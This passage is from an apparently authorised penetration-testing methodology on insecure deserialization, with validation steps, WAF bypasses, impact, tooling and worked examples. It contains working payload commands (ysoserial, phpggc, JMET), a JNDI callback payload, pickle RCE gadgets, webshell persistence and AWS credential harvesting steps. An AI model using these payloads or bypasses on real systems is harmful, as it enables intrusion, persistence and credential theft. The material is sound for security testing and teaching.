**Stopping conditions for a base-tier finding**. The 10-step methodology terminates when one of three conditions is met: (a) RCE is proven with a bounded command, and the ladder was walked cleanly, and the artifact directory has the six required inputs above — the finding is report-ready; (b) sink liveness is proven but no reachable chain fires — the finding downgrades to Reachable with the specific chain roster tried; (c) the sink probe returns no in-graph error and no callback — the finding is Suspected, and further work needs the advanced sibling's blind methodology. Do not continue past a stopping condition; the base-tier methodology's value is knowing when to hand off to the advanced sibling rather than persisting on a dead lead.

**Class-shape reporting note**. Whether the specific chain fired or not, a base-tier report always names the class shape (Java native deserialization / Jackson polymorphic typing / Python pickle / etc.) and the specific sink call-site. The class-shape framing is what the client's fix team consumes; the specific chain is what the pen-tester's follow-through demonstrates. Both belong in the report.

**Handoff to the advanced sibling**. When the base's 10-step methodology terminates in Suspected or Reachable and the target's classpath, sandbox mode, or wire format calls for more depth than the base covers, hand off to `insecure_deserialization_advanced_deep.md` for: (a) JEP 290/415 filter architecture and its bypass classes when the target enforces a filter; (b) format-parser differentials when the target routes through multiple parsers and a payload smuggling opportunity exists; (c) second-order attack-graph modeling when the write endpoint and read endpoint are decoupled; (d) blind SSTI-adjacent methodology when callbacks are unavailable; (e) per-chain classpath preconditions with gadget-graph decomposition for a target where the default ysoserial chain roster does not match; (f) wire-format fingerprint at the byte level when the base's magic-byte table is insufficient. The advanced sibling is the second-pass reference; the base's methodology terminates cleanly whether or not the advanced pass is needed.

**Handoff to the novel sibling**. When the target's version fingerprint matches an affected range in the 2024–2026 CVE frontier, load `insecure_deserialization_novel_deep.md` for the specific per-CVE mechanism and payload. The novel sibling owns the version/fix tables single-owner, so the base's version-string mentions are pointers only; the specific affected-range table lives there. Notably: jackson-databind CVE-2026-54512 (generic-type PTV bypass), XStream CVE-2024-47072 (DoS, not RCE), .NET 9 BinaryFormatter removal (starting Preview 6), and the PyTorch `weights_only` cluster (two 2025–2026 GHSAs on the "safe" path) each land where a base-tier probe would otherwise stop short. The novel sibling also holds the Sleeping Giants supply-chain reframing (Kreyssig et al., CCS'25) that reframes the audit posture as continuous rather than one-shot.

## Validation

1. **Attacker-controlled object graph reaches the dangerous sink** — proven with an in-graph error probe or a callback (the confirmation-without-RCE ladder). The callback's request headers, source IP, and timestamp are the evidence; the app's response body alone is not.
2. **Impact** — RCE (bounded command), auth bypass object, or privilege field manipulation. Record the exact command run and the exact output captured (or the exact authentication state observed).
3. **Encoded payload and exact injection point** — cookie name, parameter name, header, POST-body-field, WebSocket-frame index — recorded with the exact wrapping (base64/gzip/etc.) and content-type used.
4. **Fixed-version rebuttal** — confirmed on a fixed version or alternate instance that identical payload fails safely; this rules out infrastructure noise (transparent proxy caching, WAF rate-limit responses, coincidental other DoS).
5. **Library and version + gadget-chain class names** documented for remediation — the fix path is "upgrade to <version> and rotate <key>" specific, not "sanitize input."
6. **Reproduce with a fresh OAST host** — if the callback fired from the original OAST host, re-run with a new host and confirm the second callback also fires. This defends against stale-poisoned OAST reflections and against scanner-artifact traffic that pre-planted the first hit.
7. **Screen-record or log the exploitation attempt** — for high-value findings, keep a wire trace (mitmproxy / Burp session) and the full command output; disputes are usually resolved by re-running the payload from that trace.

## False Positives

- The blob is encrypted or signed with a verified HMAC before deserialization and the key has not leaked. The finding shifts from "deserialization" to "key management" — check the key-storage claim.
- Only primitive types deserialized (whitelist schema, no polymorphic types, PTV set to strict allow-list). A `Map<String,String>` deserialization is not a finding by itself.
- Grep hit `pickle`/`Marshal` but the code path is dead (`if False:` branch, unreachable helper, test-only fixture).
- Deserialization happens in an isolated sandbox with no network/exec primitives (verify thoroughly — sandboxes leak, and a sandbox with `--capabilities=SYS_ADMIN` is not a sandbox).
- Error mentions serialization class but input is never passed to unmarshal — a stack trace from a benign type-mismatch does not prove a sink.
- A callback beacon fires from a scanner artifact (some scanners construct benign URLDNS payloads themselves — separate scanner traffic from your own by mint-per-run OAST hosts).
- ViewState is `enableViewStateMac=true` and the machine key is neither leaked nor default. Verify by attempting to submit a modified ViewState and checking for a MAC-failure response.
- The `@type` value is checked against a strict allow-list before Jackson resolves it — read the actual `SubTypeValidator` / `PolymorphicTypeValidator` code, not the config file.
- On PHP 8.0+, a `phar://` reference to a stat/read function does *not* trigger auto-unserialize; only an explicit `Phar::getMetadata()` call does. Measure before firing.
- The `torch.load` sink is called with `weights_only=True` *and* the file is a plain tensor with no reachable branch to loader-internal reflection — but note that this is not a general clean signal, since two 2025–2026 CVEs land RCE on that path.

## Bypass Methods

- **Encoding layers** — base64 → gzip → serialize. Un-wrap and re-wrap. A WAF that only inspects one layer misses the payload.
- **Alternative parameter locations** — `session`, `session_backup`, `state`, cookie, header (`Cookie`, `Authorization`, custom), POST body, GET query. Some deployments have WAF rules on one and not the others.
- **Content-type switch** — some middleware only inspects `application/json`; an `application/octet-stream` or `application/x-java-serialized-object` body reaches the same handler unfiltered. Also `text/plain` sometimes reaches a raw-body handler.
- **Type confusion** — JSON array vs object hits different deserializer branches. `["com.evil.Gadget", {...}]` (WRAPPER_ARRAY) and `{"@class":"com.evil.Gadget","...":"..."}` (PROPERTY) map to different code paths in Jackson polymorphic mode; the WAF may match on one but not the other.
- **Unicode/UTF-7 smuggling** — in PHP serialized strings on legacy contexts, character encodings that a WAF normalizes differently from PHP itself can smuggle magic-method-triggering property names.
- **Compression layered under signing** — some MAC-check code inspects the outer envelope, not the decompressed inner content. A payload with a valid outer signature but attacker-controlled inner gzip bypasses the check.
- **Class name obfuscation** — Fastjson's `L...;` descriptor wrapping (`L com.evil.Gadget;` vs `com.evil.Gadget`), double URL encoding, Unicode escapes in class names — WAFs match on the surface form of the name, not the resolved form.
- **`$type` position swap** — Json.NET's `$type` field can appear at any position in the JSON object; some WAFs check only the first key. Moving `$type` to the end of a deep nested structure evades those.
- **Polyglot payloads** — a byte stream that is valid Java serialization *and* valid MessagePack; one middleware checks the JSON prefix, the deserializer parses the trailing Java. This is the format-parser-differential class in payload form.

## Impact

- **Remote code execution** on application servers — the headline shape, and the class expansion routes into `rce.md` for post-exec.
- **Authentication bypass** via forged session/role objects — the deserialized object arrives with attacker-chosen fields; a `role: admin` or `is_authenticated: true` bypass is one property write.
- **Privilege escalation** via manipulated field on a trusted deserialized class — a chain that reaches an entity object with a `permissions` field, or a session object with a `groups` array.
- **Full application compromise** in Java / PHP / .NET stacks with known gadget libraries on the classpath — the ecosystem-wide gadget catalog (ysoserial 34 chains, phpggc 44 frameworks, ysoserial.net across every .NET formatter) means the "gadget" is usually pre-built.
- **Data exfiltration** via a gadget that reads and posts arbitrary files — a `URLDNS`-shape chain generalized to `URLConnection.getInputStream().read()` plus a POST-back gadget.
- **Persistence** via a gadget that writes a webshell (`FileOutputStream` on a `.jsp`/`.aspx`/`.php` inside the webroot), a scheduled task (`cron`, `Windows Task Scheduler`), or a systemd unit.
- **Lateral movement** — the compromised app server usually holds credentials for adjacent services (database, cache, secret store); post-exec expansion via `rce.md` covers the general escalation, but the deserialization primitive is the specific entry point.
- **Supply-chain persistence via Sleeping Giants** — an attacker with commit access to a dependency can activate a dormant chain in a future release, which propagates to every downstream consumer. Detection lag is measured in months.
- **DoS** — even without RCE, format-parsing DoS (XStream CVE-2024-47072 stack overflow; PyJWT nested-JWT RecursionError; the general "billion laughs" / deeply-nested-object class) is a service-availability finding. Not the headline, but real.

## Pro Tips

1. Fingerprint versions before firing ysoserial — wrong chain wastes time and adds WAF noise.
2. Start with DNS/HTTP callback gadgets before command execution in production-like targets. The ladder (in-graph error → DNS → HTTP → sleep → file-read → exec) is auditable; skipping it is not.
3. Check cookies named `JSESSIONID` alternatives, `.ASPXAUTH`, `laravel_session`, `_yourapp_session`, custom tokens.
4. In white-box, trace from `readObject` / `unserialize` / `pickle.loads` backward to source.
5. ViewState MAC off is still common on legacy ASP.NET — test early on `.aspx` apps.
6. Model JNDI lookup, reference/object processing, remote codebase loading, and local factory invocation as separate stages.
7. A "blocked" enterprise deserialization endpoint may still be reachable through a proxy or path-normalization mismatch — pair `semantic_confusion.md`.
8. Sleeping Giants means your last audit is stale on the next dependency bump — re-audit on release, not on schedule.
9. `weights_only=True` on `torch.load` is not the end of the audit — two 2025–2026 CVEs land on that path.
10. JWT is a deserialization sink whenever `cty: JWT` triggers recursive verify — do not treat auth as separate from deser.
11. Grep `secret_key_base`, `master.key`, `machine.config`, `web.config` in git history and any static-served path — leaked keys collapse the signature layer that would otherwise gate every finding in this class.
12. Celery, Dask, Ray, and Redis-backed job frameworks pickle by default — the "queue that accepts jobs" endpoint is a deserialization sink even when there is no obvious JSON body.
13. A phar renamed `.jpg` bypasses extension filters; PHAR detection reads the internal stub, not the filename. Test upload-then-reference chains with the extension mismatch.
14. Session stores backed by pickle (Flask-Session, Django with `PickleSerializer`, older Django SessionStore on Redis) turn a cache-write primitive into RCE — pair `cache_poisoning`.
15. HuggingFace `.pt` / `.pth` files are pickle blobs; any inference service that loads a user-supplied model is a supply-chain deserialization sink even before you look at the app code.

## Tooling

Payload generation is the practitioner's core tool. The sandbox has `git`/`python`/`go` and **interactsh-client** (OAST); add a JRE for the Java generator, or `php-cli` for phpggc.

| Tool | Language / format | Use |
|------|-------------------|-----|
| **ysoserial** (frohoff) | Java native | 34 gadget chains. Start with `URLDNS` (DNS oracle, no exec) to prove the sink; then match a chain to the fingerprinted classpath. Needs a JRE. |
| **ysoserial.net** (pwntester) | .NET `BinaryFormatter` / `LosFormatter` / `SoapFormatter` / Json.NET | Windows/.NET gadget payloads. `ObjectDataProvider` reaches 11 sinks; `TextFormattingRunProperties`, `WindowsIdentity`, `PSObject` for the classical ViewState/BinaryFormatter/DataContractSerializer/Json.NET/LosFormatter/NetDataContractSerializer/SoapFormatter targets. Needs .NET/mono — usually out of scope in a Linux sandbox unless the target is remote. |
| **phpggc** (ambionics) | PHP `unserialize` / PHAR | 44-framework POP chain roster. Needs `php-cli`. |
| **marshalsec** (Bechler) | Java Hessian/Burlap, Kryo, JSON, and JNDI reference tooling | Use only from a reviewed, pinned upstream commit when a non-native Java marshaller requires it. No stable release; intentionally bundles historical gadget dependencies — do not treat it as a globally installed default tool. |
| **fickling** | Python pickle | Static analysis of pickle streams to detect malicious payloads without executing; useful when auditing a captured blob before firing it. |
| **flightsim** / **BURPCollab** | Any | Additional OAST providers when interactsh is filtered by the target's egress policy — some environments blocklist `oast.fun` specifically. |
| **interactsh-client** | Any | Primary OAST callback for DNS/HTTP oracle confirmation. Mint a unique host per test run. |
| **JMET** | Java JMS `ObjectMessage` | ActiveMQ / IBM MQ `ObjectMessage` payload generator; wraps ysoserial gadgets in JMS envelopes. |

```bash
# Java: prove the sink with a no-exec DNS oracle BEFORE any RCE chain
java -jar ysoserial.jar URLDNS "http://$(interactsh-client -json | jq -r .host)" | base64 -w0

# PHP: generate a Laravel POP chain (base64), fast path via a framework gadget
./phpggc -b Laravel/RCE9 system id

# .NET ViewState with a leaked machine key (Linux → Windows target)
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c calc" \
  --path="/page.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey=<hex> \
  --validationalg="SHA1" --validationkey=<hex>

# Python: audit a captured pickle statically before running it
fickling <blob.pkl>                       # prints suspicious ops (GLOBAL, REDUCE, INST, OBJ)
fickling --check-safety <blob.pkl>        # yes/no with explanation

# JMS: fire a ysoserial chain wrapped as an ObjectMessage into an ActiveMQ queue
java -jar jmet.jar -Q queue.name -I install -Y 'ysoserial CommonsCollections5 "id"' <broker-host>
```

Confirm the sink with a callback before firing a command-exec chain, and match the chain to the fingerprinted library version — the wrong chain just adds noise.

**Chain-selection heuristic at base tier**. Given a fingerprinted Java target with `commons-collections:3.1` on classpath, the base-tier decision is straightforward: URLDNS to confirm the sink, then CommonsCollections1 through 7 as the primary chain family. Given a .NET target with any formatter other than `None` on Json.NET, the base-tier decision is: `ObjectDataProvider` gadget across every formatter it reaches. Given a Python target with `pickle.loads(request.cookies['session'])`, the base-tier decision is: a `__reduce__` gadget with `os.popen('id').read()`. Given a PHP 7.x target with an unserialize sink on a Laravel app, the base-tier decision is: `phpggc Laravel/RCE9 system id -b`. Given a Node target with `node-serialize` in the dependency list, the base-tier decision is: `_$$ND_FUNC$$_` marker in a JSON field.

Where the classpath does not match any known chain, do not spray — return to fingerprinting. A miss on chain selection wastes time and adds WAF noise; a repeat pass on fingerprinting narrows the target and produces the correct chain first-fire. If no chain fires and the classpath is fingerprinted correctly, Sleeping Giants may apply — the target's dependency-bump history may have activated a chain not yet in ysoserial's default roster. Load `insecure_deserialization_novel_deep.md § Sleeping Giants` for the audit-cadence framing when this happens.

**Auxiliary primitives on the sandbox** — `openssl` for algorithm-aware signing when forging JWT / signed cookies with a leaked key; `xxd` and `hexdump` for magic-byte confirmation; `python3 -c "import pickle,base64; …"` for one-off pickle construction; `jq` for JSON reshaping around a polymorphic-typing sink; `curl -k` for delivering the payload with the exact wire format the sink expects (some sinks parse only from specific Content-Type headers).

## Worked Example — End-to-End Chain on a Java + Jackson Target

The class shape becomes concrete once walked through. Suppose the target is a Java web app that accepts JSON POSTs at `/api/v1/preferences`, and audit reveals `enableDefaultTyping()` was called on the shared `ObjectMapper` singleton in a bootstrap class.

1. **Fingerprint** — a malformed `@type` value yields a stack trace mentioning `jackson-databind-2.16.2` and shows `commons-collections:3.2.2`, `spring-web:5.3.30` on the classpath. Note the versions.
2. **Sink liveness** — construct the URLDNS-equivalent for Jackson: `["com.sun.rowset.JdbcRowSetImpl", {"dataSourceName":"ldap://<oast>/x","autoCommit":true}]`. Send it as the request body. `interactsh-client` receives a DNS hit → the sink runs, and the JNDI resolver is reachable outbound.
3. **Reachability escalation** — the DNS hit alone confirms deserialization; the LDAP-path portion confirms outbound. Test with an LDAP-scheme where the responder returns a `Reference` — some JDK configurations still allow remote-code loading, but modern JDKs disable it by default. Fall back to a local-`ObjectFactory` reach: `commons-collections` on classpath means a `TemplatesImpl` chain is viable.
4. **Chain selection** — build a Jackson payload wrapping the CommonsCollections4 chain (Jackson can serialize any Java object). The chain runs on `readObject` during deserialization; the `Runtime.exec` sink fires. Use `id` as the command; capture the output via a `LazyMap` gadget that reflects the exec output into an error message the app returns.
5. **Confirm impact** — the response body contains `uid=100(webapp) gid=100(webapp)`, and the OAST source-IP matches the target's egress. RCE proven.
6. **Rebuttal check** — retry against staging; the payload fails with a JEP 290 filter rejection. Difference isolated to prod's missing `-Djdk.serialFilter=`. Report as an incomplete-defense finding shape, not a code-defect shape.
7. **Chain to next class** — with RCE, run `/proc/self/environ | grep -i aws`. The env includes `AWS_ROLE_ARN` and `AWS_WEB_IDENTITY_TOKEN_FILE`. Route to `cloud/aws.md § IRSA` for the credential-exchange details. The deserialization primitive was the entry; the impact expands via `rce.md` then `cloud/aws.md`.

Every hop transferred a specific capability: (grep hit → confirmed sink), (confirmed sink → outbound-reachable JNDI), (outbound-reachable → chain-selectable), (chain-selectable → RCE), (RCE → cloud-cred read). The report writes up each capability, not each payload variant.

**Variant of the worked example on a target without JNDI outbound**. Same first three steps; step 3 fails when the LDAP responder gets no reply. Fall back to a local-`ObjectFactory` reach via `TemplatesImpl` (present via `commons-collections` transitively), which does not need outbound. Step 4 then constructs the CommonsCollections4 payload wrapping `TemplatesImpl` bytecode; step 5 fires and reflects `id` output. The chain is the same shape but the reachability constraint changed the class of gadget selected. This is why the confirmation ladder terminates at reachability before chain-selection — an early reachability answer prunes the chain space.

**Variant on a Python target with `pickle.loads` on a session cookie**. Fingerprint step is grep for `pickle.loads` and observation of cookie shape (base64 blob starting with `\x80\x04` after decode). Sink liveness is a `subprocess.Popen(['nslookup', '<oast>'])`-shape `__reduce__` gadget; OAST DNS hit confirms. Exec is `os.popen('id').read()` reflected in the response. Rebuttal on a same-app instance with `PickleSerializer` swapped for `JSONSerializer` — the same payload lands as base64 garbage in the deserializer and fails safely. Report per the six inputs; route the post-exec to `rce.md`.

## Summary

Treat every deserialization of untrusted data as critical. The primitive is decided by unmarshaller + classpath + invocation; each is a gate. Safe patterns use JSON schema validation without type polymorphism, `yaml.safe_load`, signed encrypted tokens with rotated keys, JEP 290/415 filters on Java, `TypeNameHandling.None` on Json.NET, and — recognizing the Sleeping Giants reframe — continuous re-audit on every dependency bump because gadget-chain reachability is a fluctuating property. Prove impact with a callback oracle or bounded execution before firing anything destructive; the confirmation-without-RCE ladder (in-graph error → DNS → HTTP → sleep → file-read → exec) is the auditable path. The three-file split is deliberate: this base owns the technique-class framing and the routing; `insecure_deserialization_advanced_deep.md` owns parser/format differentials, second-order/blob-bypass exploitation, and JEP 290/415 filter-bypass classes; `insecure_deserialization_novel_deep.md` owns the Sleeping Giants dissection, the canonical per-CVE version/fix tables (jackson-databind CVE-2026-54512, XStream CVE-2024-47072, .NET 9 BinaryFormatter removal timeline, PyJWT September 2026 cluster, ML-pipeline PyTorch weights_only cluster, serialize-javascript prototype-poisoning cluster), and the FLASH/GCMiner detection-frontier framing.
